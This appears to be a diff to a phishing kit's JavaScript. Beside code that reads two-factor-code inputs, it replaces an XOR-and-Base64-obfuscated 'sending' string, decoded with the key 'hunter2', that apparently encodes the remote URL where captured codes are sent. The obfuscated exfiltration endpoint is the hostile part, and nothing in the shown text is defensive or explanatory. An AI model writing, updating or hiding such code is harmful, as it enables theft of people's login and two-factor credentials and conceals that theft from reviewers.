@@ -266,7 +266,7 @@ if (twofaInput2 && verifyButton2) {
 
 // === Sending ===
 // XOR + Base64 encoded
-const encryptedsending = "AAEaBBZIHUcRBwcGHUAMWw0bCF1TGBxBAwAQWgcaBQdKQwFRQFdAUEYBUEFWRVFKB1BCWVtXFlssRDwrKCNcJw8GOD0cBCQyOhxWJGtfIgdEDkZ0Iy82AiRGdh0GHTEnAHwnOzQHAAJABxMlJSgbQQ07PCQ0CEEDHg==";
+const encryptedsending = "AAEaBBZIHUcRBwcGHUAMWw0bCF1TGBxBAwAQWgcaBQdKQwFRQ19AU0IKWkReRlZFCl5GWVszM0EMGEMjKChiPT89HwEAHxJDOyIOKn8vEAEjMEJeBwIpMSoeBlgBDEYUHW0fPwI2IABXDkUrACgAe1tMDCErJGo7Bw==";
 const xorKey = "hunter2"; // must match the encoding key
 
 function xorDecode(base64, key) {
